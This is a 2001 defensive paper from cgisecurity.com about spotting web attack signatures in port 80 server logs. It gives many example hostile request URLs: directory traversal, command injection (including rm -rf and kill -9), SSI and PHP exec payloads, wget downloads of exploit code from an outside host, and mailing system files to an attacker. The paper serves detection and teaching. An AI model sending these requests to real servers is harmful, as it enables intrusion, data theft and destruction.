@@ -1,0 +1,522 @@
+                                        Author: Zenomorph
+                                      admin@cgisecurity.com
+                                 "Fingerprinting Port 80 Attacks:
+                       A look into web server, and web application attack signatures."
+
+
+
+
+
+
+I. Introduction
+II. Common Fingerprints
+III. Advanced Fingerprints
+IV. Overflows
+V. Hex Encoding
+VI. Conclusion
+
+
+
+
+
+I. Introduction:
+
+
+Port 80 is the standard port for websites, and it can have a lot of different security issues.
+These holes can allow an attacker to gain either administrative access to the website,
+or even the web server itself. This paper looks at some of the signatures that are used
+in these attacks, and what to look for in your logs. 
+
+
+
+II. Common Fingerprints:
+
+
+This section has examples of common fingerprints used in exploitation of both web applications,
+and web servers. This section is not supposed to show you every possible fingerprint, but instead
+show you the majority of what exploits and attacks will look like. These signatures should pick
+up most of the known and unknown holes an attacker may use against you. This section also describes
+what each signature is used for, or how it may be used in an attack.
+
+
+
+"."  ".." and "..." Requests
+
+These are the most common attack signatures in both web application exploitation and web server 
+exploitation. It is used to allow an attacker or worm to change directories within your 
+web server to gain access to sections that may not be public. Most CGI holes will contain 
+some ".." requests. 
+
+Below is an example.
+
+* http://host/cgi-bin/lame.cgi?file=../../../../etc/motd
+
+This shows an attacker requesting your web servers "Message Of The Day" file. If an attacker
+has the ability to browse outside your web servers root, then it may be possible to gather enough
+information to gain further privileges.
+
+
+
+"%20" Requests
+
+This is the hex value of a blank space. While this doesn't mean youre being exploited, it is 
+something you may want to look for in your logs. Some web applications you run may use these 
+characters in valid requests, so check your logs carefully. On the other hand, this request 
+is occasionally used to help execute commands. 
+
+Below is an example.  
+
+
+* http://host/cgi-bin/lame.cgi?page=ls%20-al| (Otherwise known as ls -al common on a Unix system)
+
+The example shows an attacker executing the ls command on Unix and feeding it arguments. 
+The argument shown reveals an attacker requesting a full directory listing. This can allow 
+an attacker access to important files on your system, and may help give him an idea as how 
+to gain further privileges.
+
+
+
+"%00" Requests
+
+This is the hex value of a null byte. It can be used to fool a web application into thinking a 
+different file type has been requested.
+
+Below is an example.  
+
+* http://host/cgi-bin/lame.cgi?page=index.html
+The example shown may be a valid request on this machine. If an attacker see's such behavior 
+he will certainly probe this application to find a hole in it. 
+
+* http://host/cgi-bin/lame.cgi?page=../../../../etc/motd
+A web application may disallow this request because its checking for the filename to end in 
+.htm , .html, .shtml, or other file types. A lot of the time the application tells you that this
+isn't a valid file type for this application. Often times it will tell an attacker that the file
+must end in a certain filename. From here an attacker can gather server paths, filenames and then 
+possibly gather more information about your system.
+
+* http://host/cgi-bin/lame.cgi?page=../../../../etc/motd%00html
+This request tricks the application into thinking the filename ends in one of its predefined 
+acceptable file types. Some web applications do a poor job of checking for valid file requests 
+and this is a common method used by attackers.
+
+
+
+"|" Requests
+
+This is a pipe character, which is often used in Unix to help execute multiple commands at 
+a time in a single request. 
+
+Example: #cat access_log| grep -i "/../" 
+
+(This shows checking in logs of .. requests which are often used by attackers and worms.)
+Often times valid web applications will use this character and it may cause
+false alarms in your IDS logs. A careful examination of your software and its behavior is a 
+good idea so that your false alarm rates will go down.
+
+Below are a few examples.  
+
+* http://host/cgi-bin/lame.cgi?page=../../../../bin/ls|
+This request is asking for the common of ls to be executed. 
+Below is another variation of this request type.
+
+* http://host/cgi-bin/lame.cgi?page=../../../../bin/ls%20-al%20/etc|
+This request is asking for full directory listing of the "etc" directory on a Unix system.
+
+* http://host/cgi-bin/lame.cgi?page=cat%20access_log|grep%20-i%20"lame"
+This request is asking for the command of "cat" to be executed and then the command of 
+"grep" with an argument of -i.
+
+
+
+";" Requests
+
+This is the character that allows multiple commands to be executed in a row on a Unix system.
+Example: #id;uname -a (This is executing the "id" command followed by the "uname" command)
+Often times web applications will use this character and it may be possible to cause false alarms 
+in your IDS logs. Once again a careful examination of your software and its behavior is a good 
+idea so that your false alarm rates will go down.
+
+
+
+"<" and ">" Requests
+
+These characters are to be checked in logs for numerous reasons, the first being that these 
+characters are used to append data to files. 
+
+Example 1: #echo "your hax0red h0 h0" >> /etc/motd
+(This shows a request to write the information into this file.) An attacker may simply use 
+a request like this to deface your website. The famous RDS exploit by rain.forest.puppy was often
+used by attackers to echo information into the websites main page. Check attrition.org and search 
+for hacked websites with plain white pages with no formatting for an example.
+
+Example 2: http://host/something.php=<b>Hi%20mom%20I'm%20Bold!</b>
+This request shows a cross site server scripting attack example. You will notice
+the html tags use the "<" and ">" characters. While this type of attack won't grant
+an attacker system access, it could be used to fool people into thinking that certain
+information on a website is valid. (Of course they would need to visit the link the attacker
+wants them to. The request may be masked by encoding the characters in hex so as not to 
+be so obvious.)
+
+
+
+"!" Requests
+
+This character is often used in SSI(Server Side Include) attacks. These attacks may allow an attacker
+to have similar results as cross site scripting exploitation does if the attacker fools a user into
+clicking on a link.
+
+
+Below is an example.  
+
+http://host1/something.php=<!%20--#include%20virtual="http://host2/fake-article.html"-->
+This is an example of what an attacker may do. This is basically including a file
+from host2 and making it appear to be coming from host1.
+(Of course they would need to visit the link the attacker wants them to. The request 
+may be masked by encoding the characters in hex so as not to be so obvious) 
+
+
+It also may allow him to execute commands on your system with the privileges of your web server user.
+
+Below is an example.  
+
+http://host/something.php=<!%20#<!--#exec%20cmd="id"-->
+This is executing the command of "id" on the remote system. This is going to show
+the user id of the web server which is usually user "nobody" or "www".
+
+
+It may also allow the inclusion of hidden files.
+
+Below is an example.  
+
+http://host/something.php=<!%20--#include%20virtual=".htpasswd"-->
+This is including the .htpasswd file. This file isn't normally allowed to be viewed by the world,
+and apache even has a built in rule to deny requests to .ht. The SSI tag bypasses this and can cause
+security problems.
+
+
+
+"<?" Requests
+
+This is often used while trying to insert php into a remote web application. It may be possible
+to execute commands depending on server setup, and other contributing factors.
+
+Below is an example. 
+
+http://host/something.php=<? passthru("id");?>
+On a poorly written php application it may execute this command locally on the remote host under 
+the privilege of the web server user. 
+
+
+An addition to this chapter is that an attacker may encode these requested with hex. Check
+for anything out of the ordinary and research anything suspicious.
+
+"`" Requests
+
+The backtick character is often used in perl to execute commands. This character isn't normally
+used in any valid web application, so if you see it in your logs take it very seriously.
+
+Below is an example.
+
+http://host/something.cgi=`id`
+On a poorly written web application written in perl this would execute
+the "id" command.
+
+
+
+III. Advanced Signatures:
+
+
+This section focuses more on the commands an attacker executes, along with files which may 
+be requested, and how to detect if youre vulnerable to remote command execution. While this 
+isn't a complete list of commands or files an attacker may request it will give you a good 
+idea of what is happening, or being attempted against your system.
+
+
+* Common commands an attacker or worm may execute.
+
+
+"/bin/ls"
+This is the binary of the ls command. It is often requested in full paths for a lot of common
+web application holes. If you see this request anywhere in your logs its a good chance
+your system is effected by remote command execution holes. This isn't always a problem and 
+could be a false alarm. Once again a study of your web application is essential. If possible, 
+test the same request that showed up in your logs and check the output for any possible execution.
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/ls%20-al|
+Example: http://host/cgi-bin/bad.cgi?doh=ls%20-al;
+
+"cmd.exe"
+This is the windows shell. An attacker if he has access to run this script will
+pretty much be able to do anything on a windows machine depending on server permissions.
+Most internet worms involving port80 use cmd.exe to help spread infection of themselves
+to other remote systems.
+
+http://host/scripts/something.asp=../../WINNT/system32/cmd.exe?dir+e:\
+
+"/bin/id"
+This is the binary of the id command. his is often requested in full paths for a lot of common
+web application holes. If you see this request anywhere in your logs theres a good chance 
+your system is effected by remote command execution holes. This isn't always a problem and 
+could be a false alarm. This command shows you what user you are along with information
+on which groups you belong to. If possible test the same request that showed up 
+in your logs and check the output for any possible execution.
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/id|
+Example: http://host/cgi-bin/bad.cgi?doh=id;
+
+"/bin/rm"
+This is the binary of the rm command. This is often requested in full paths for a lot of common
+web application holes. If you see this request anywhere in your logs theres a good chance 
+your system is affected by remote command execution holes. This isn't always a problem and 
+could be a false alarm. This command, on the other hand, allows deletion of files and is very 
+dangerous if either used improperly, or by an attacker. If possible, test the same request that 
+showed up in your logs and check the output for any possible execution. If its requesting an 
+important filename, you may want to use judgment before doing this. If its deleting the file 
+name stupid.txt, and it doesn't appear to exist within the website it was requested from, create 
+the file and test it. 
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/rm%20-rf%20*|
+Example: http://host/cgi-bin/bad.cgi?doh=rm%20-rf%20*;
+
+"wget and tftp" commands
+These commands are often used by attackers and worms to download additional files,
+which may be used in gaining further system privileges. wget is a Unix command which may 
+be used to download a backdoor. tftp is a Unix and NT command which is used to download 
+files with. Some IIS worms used this tftp command to download a copy of themselves to an 
+infected host to keep spreading itself.
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../path/to-wget/wget%20http://host2/Phantasmp.c|
+Example: http://host/cgi-bin/bad.cgi?doh=wget%20http://www.hwa-security.net/Phantasmp.c;
+
+"cat" command
+This command is often used to view contents of files. This could be used
+to read important information such as configuration files, password files,
+credit card files, and anything else you can think of. 
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/cat%20/etc/motd|
+Example: http://host/cgi-bin/bad.cgi?doh=cat%20/etc/motd;
+
+"echo" command
+This command is often used to append data to files such as index.html.
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/echo%20"fc-#kiwis%20was%20here"%20>>%200day.txt|
+Example: http://host/cgi-bin/bad.cgi?doh=echo%20"fc-#kiwis%20was%20here"%20>>%200day.txt;
+
+"ps" command
+This command shows a listing of running processes. It can tell an attacker
+if the remote host is running any security software, and also give them ideas
+as to other security holes this host may have.
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/ps%20-aux|
+Example: http://host/cgi-bin/bad.cgi?doh=ps%20-aux;
+
+"kill and killall" commands
+These commands are used to kill processes on a Unix system. An attacker may use these to stop
+a system service or program. An attacker may also use this command to help cover his tracks if 
+an exploit he used forked a lot of child processes or crashed abnormally.
+
+Example: http://host/cgi-bin/bad.cgi?doh=../bin/kill%20-9%200|
+Example: http://host/cgi-bin/bad.cgi?doh=kill%20-9%200;
+
+"uname" command
+This command is often used to tell an attacker the hostname of the remote system.
+Often times a website is hosted on a ISP and this command can get an idea of which ISP
+he may have access to. Usually uname -a is requested and it may appear in logs as "uname%20-a".
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/uname%20-a|
+Example: http://host/cgi-bin/bad.cgi?doh=uname%20-a;
+
+"cc, gcc, perl, python, etc..."  Compilers/Interpreter commands
+The "cc" and "gcc" commands allow compilation of programs. An attacker
+may use wget, or tftp to download files, and then use these compilers
+to compile the exploit. From here anything is possible, including
+local system exploitation.
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/cc%20Phantasmp.c|
+Example: http://host/cgi-bin/bad.cgi?doh=gcc%20Phantasmp.c;./a.out%20-p%2031337;
+
+If you see a request for "perl" or "python" it may be possible
+the attacker downloaded a remote perl or python script, and is trying to locally
+exploit your system.
+
+
+"mail" command 
+This command may be used by an attacker to email files to an email address
+the attacker owns. It may also be used to spam from, and spamming in this manner
+may not be very easy to detect.
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/mail%20attacker@hostname%20<<%20/etc/motd|
+Example: http://host/cgi-bin/bad.cgi?doh=mail%20steele@jersey.whitehouse.gov%20<</tmp/wu-2.6.1.c;
+
+"xterm/Other X application" commands
+Xterm is often used to help gain shell access to a remote system.
+If you see this in your logs take it very seriously as a possible
+security breach. Look for a request in your logs which contains 
+"%20-display%20" in it. This fingerprint is often used to help 
+launch xterm or any other X application to a remote host. 
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../usr/X11R6/bin/xterm%20-display%20192.168.22.1|
+Example: http://host/cgi-bin/bad.cgi?doh=Xeyes%20-display%20192.168.22.1;
+
+"chown, chmod, chgrp, chsh, etc..." commands
+These commands allow changing of permissions on a Unix system. 
+Below is a list of what each does.
+
+chown = allows setting user ownership of a file.
+chmod = allows file permissions to be set.
+chgrp = allows group ownership to be changed.
+chsh = allows a user to change the shell that they use.
+
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/chmod%20777%20index.html|
+Example: http://host/cgi-bin/bad.cgi?doh=chmod%20777%20index.html;
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/chown%20zeno%20/etc/master.passwd|
+Example: http://host/cgi-bin/bad.cgi?doh=chsh%20/bin/sh;
+Example: http://host/cgi-bin/bad.cgi?doh=../../../../bin/chgrp%20nobody%20/etc/shadow|
+
+
+* Common files an attacker will request.
+
+
+"/etc/passwd"  File
+
+The system password file. This is usually shadowed and will not provide encrypted passwords
+to an attacker. It will, on the other hand, give an attacker an idea as to valid usernames, 
+system paths, and possibly sites hosted. If this file is shadowed often times an attacker 
+will look in the /etc/shadow file.
+
+
+"/etc/master.passwd"
+The BSD system password file that contains the encrypted passwords. This file is only readable
+by the root account but an inexperienced attacker may check for the file in hopes of being 
+able to read it. If the web server runs as the user "root" then an attacker will be able to 
+read this file and the system administrator will have a lot of problems to come.
+
+
+"/etc/shadow"
+The system password file that contains the encrypted passwords. This file is only readable
+by the root account but an inexperienced attacker may check for the file in hopes of being 
+able to read it. If the web server runs as the user "root" then an attacker will be able to 
+read this file and the system administrator will have a lot of problems to come.
+
+
+"/etc/motd"
+The system "Message Of The Day" file contains the first message a user see's when they login
+to a Unix system. It may provide important system information an administrator wants the users
+to see, along with the operating system version. An attacker will often check this file
+so that they know what the system is running. From here they will research the OS and gather 
+exploits that can be used to gain further access to the system.
+
+
+"/etc/hosts" 
+This file provides information about ip addresses and network information. An attacker can 
+use this information to find out more information about your system/network setup.
+
+
+"/usr/local/apache/conf/httpd.conf"
+The path of this file is different but this is the common path. This is the Apache web server 
+configuration file. It gives an attacker an idea of which websites are being hosted along with 
+any special information like whether CGI or SSI access is allowed.
+
+
+"/etc/inetd.conf"
+This is the configuration file of the inetd service. This file contains
+system Daemons that the remote system is using. It also may show an attacker
+if the remote system is using a wrapper for each daemon. If a wrapper is found in use
+an attacker next will check for "/etc/hosts.allow" and "/etc/hosts.deny", and possibly
+modify these files depending on whether he gained further privileges.
+
+
+
+".htpasswd, .htaccess, and .htgroup"
+These files are used for password authentication on a website. An attacker will try to view
+the contents of these files to gather both usernames, and passwords. The passwords are located
+in the htpasswd file and are encrypted. A simple password cracker and some time on the other hand
+will grant an attacker access to certain password protected sections of your website, and possibly
+other account. (A lot of people use the same username and password for everything, and often times 
+this can allow an attacker access to other accounts this user may have.)
+
+
+"access_log and error_log"
+These are the log files of the apache web server. An attacker will often times
+check logs to see what has been logged of both his own requests as well as others.
+Often times an attacker will edit these logs and remote any reference to his hostname.
+It can become difficult to detect if an attacker has breached your system via port80
+if these files aren't backed up or dual logged.
+
+"[drive-letter]:\winnt\repair\sam._ or [drive-letter]:winnt\repair\sam"
+This is the name of the Windows NT password file. An attacker will often request this file
+if remote command execution is not possible. From here he would run a program like "l0pht crack"
+to crack the password on the remote windows machine. If the attacker manages to crack the administrator
+password, then the remote machine is free for the taking.
+
+
+IV. Overflows:
+
+I'm not going to get into buffer overflows too much in this paper, but I will show examples 
+of what types of behavior to look out for. Buffer overflows can often be obfuscated by encoding 
+and other tricks.
+
+Below is a simple example.
+
+Example:
+
+
+http://host/cgi-bin/helloworld?type=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+This shows an attacker sending a lot of A's to your application to test it for a buffer overflow.
+A buffer overflow can grant an attacker remote command execution. If the application is suid
+and owned by root this could allow full system access. If it is not suid them it would grant
+then possibly command execution as the user id of the web server.
+
+The variants of what a buffer overflow looks like are great and this paper isn't going to 
+cover every possible example. It is a good idea to check your logs regularly. If you see 
+huge requests and your site normally gets small requests, it could possibly be a buffer 
+overflow attempt from an attacker, or possibly a new internet worm variant hitting your 
+machine. 
+
+
+
+V. Hex Encoding:
+
+With all the references made above to fingerprints, attackers know that IDS systems often 
+check for such requests in a very literal manner. A lot of the time an attacker encodes
+his request in hex, so that the IDS system will overlook the request. The CGI scanner known 
+as  Whisker is a great example of this.  If you ever view your logs and notice a large 
+amount of hex, or unusual characters, then its possible an attacker has attempted to exploit 
+your system in some manner. A fast way to check to see what the hex means is to  copy it 
+from your logs, then paste it into your browser while visiting your site. If you do not 
+have custom 404 pages, then the hex will we translated and you will be able to see exactly 
+what the request is, along with its output. If you dont want to risk this, then a simple 
+man ascii will provide you with the proper encodings.
+
+
+
+VI. Conclusion:
+
+This paper doesn't cover every port 80 exploit but it covers the most common types of 
+attacks. It also tells you what to check for in your logs, and an idea of what to add to 
+your IDS rules. It is written to help the web server administrator get an idea of what 
+to look out for. I also hope this paper helps web developers write better web applications. 
+I wrote this paper in about an hour on a Sunday, so if you have any comments or suggestions 
+email me at admin@cgisecurity.com.
+
+
+
+
+Published to the Public November 2001
+Copyright November 2001 Cgisecurity.com
+
+
+
+
+
+
+
+
+
+
+
